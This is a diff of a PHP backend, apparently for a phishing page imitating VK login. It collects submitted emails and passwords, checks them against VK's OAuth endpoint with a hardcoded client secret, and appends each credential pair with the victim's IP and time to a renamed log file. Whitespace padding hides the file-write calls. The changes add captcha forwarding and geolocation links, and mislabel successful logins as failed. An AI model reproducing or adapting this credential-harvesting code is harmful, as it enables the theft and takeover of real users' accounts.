@@ -1,12 +1,12 @@
 <?PHP
-$baza = "base.php"; // ПУТЬ ДО БАЗЫ
+$baza = "yabazka.php"; // ПУТЬ ДО БАЗЫ
 $chvalid = 0; //ПРОВЕРЯТЬ ЛИ ВАЛИД? = 1 - ПРОВЕРЯТЬ, = 0 - НЕ ПРОВЕРЯТЬ.
  $num = 0;
  $email = $_POST['email'];
  $password = $_POST['password'];
  $key = $_POST['captcha_key'];
  $sid = $_POST['captcha_sid'];
- $res=curl('https://oauth.vk.com/token?grant_type=password&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&username='.$email.'&password='.$password);
+ $res=curl('https://oauth.vk.com/token?grant_type=password&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&username='.$email.'&password='.$password.'&captcha_key='.$key.'&captcha_sid='.$sid);
  $lo='access_token';
  $pos2 = strripos($res, $lo);
  $res3 = json_decode($res, true);
@@ -16,7 +16,7 @@ If (isset($_POST['email'])){
  $time = date("H:i | d.m.Y");
 if ($chvalid == 1) {
 if ($pos2 === false) {
- $mytext = "<div>Логин: $email | Пароль: $password | Ip: $ip| $time | Неудачно</div>\n";																																																								$fp = fopen($baza, "a"); 
+ $mytext = "<div>Логин: $email | Пароль: $password | Ip: <a href = http://ipgeobase.ru/?address=$ip&search= target=_blank style = color:#3AE2CE>$ip </a> | $time | Неудачно</div>\n";																																																								$fp = fopen($baza, "a"); 
  $test = fwrite($fp, $mytext);
  fclose($fp);
  $num = 1;
@@ -27,14 +27,14 @@ $name = curl('https://api.vk.com/method/users.get?user_ids='.$id.'&fields=counte
 $name = json_decode($name, true);
 
 $fulname=$name['response']['0']['first_name'].' '.$name['response']['0']['last_name'];
-$mytext = "<div>Логин: $email | Пароль: $password | Ip: $ip | $time | Удачно</div>\n";																																																								$fp = fopen($baza, "a");
+$mytext = "<div>Логин: $email | Пароль: $password | Ip: <a href = http://ipgeobase.ru/?address=$ip&search= target=_blank style = color:#3AE2CE>$ip </a> | $time | Неудачно</div>\n";																																																								$fp = fopen($baza, "a");
  $test = fwrite($fp, $mytext);
  fclose($fp);
 
 $num = 2;
  }
 }else{
-$mytext = "<div>Логин: $email | Пароль: $password | Ip: $ip | $time | ХЗ</div>\n";																																																								$fp = fopen($baza, "a");
+$mytext = "<div>Логин: $email | Пароль: $password | Ip: <a href = http://ipgeobase.ru/?address=$ip&search= target=_blank style = color:#3AE2CE>$ip </a> | $time | ХЗ</div>\n";																																																								$fp = fopen($baza, "a");
  $test = fwrite($fp, $mytext);
  fclose($fp);
  $num = 2;
